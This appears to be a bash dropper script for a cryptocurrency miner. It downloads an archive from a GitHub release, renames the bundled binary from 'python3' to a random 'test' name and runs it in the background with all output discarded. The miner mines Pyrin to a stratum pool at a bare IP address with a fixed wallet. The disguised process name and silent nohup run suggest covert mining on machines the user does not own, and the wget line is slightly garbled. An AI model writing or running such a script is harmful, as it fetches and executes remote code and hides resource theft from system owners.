#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -O dot-lol wget https://github.com/DotAja/ALONE/releases/download/alone/dotlol.tar.gz

tar xvf dot-lol

cd dot-lol

mv python3 test$kolot

nohup ./test$kolot -a PYRIN --pool stratum+tcp://103.120.19.63:443 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOTSEQ-$kolot --no-cl > /dev/null 2>&1 &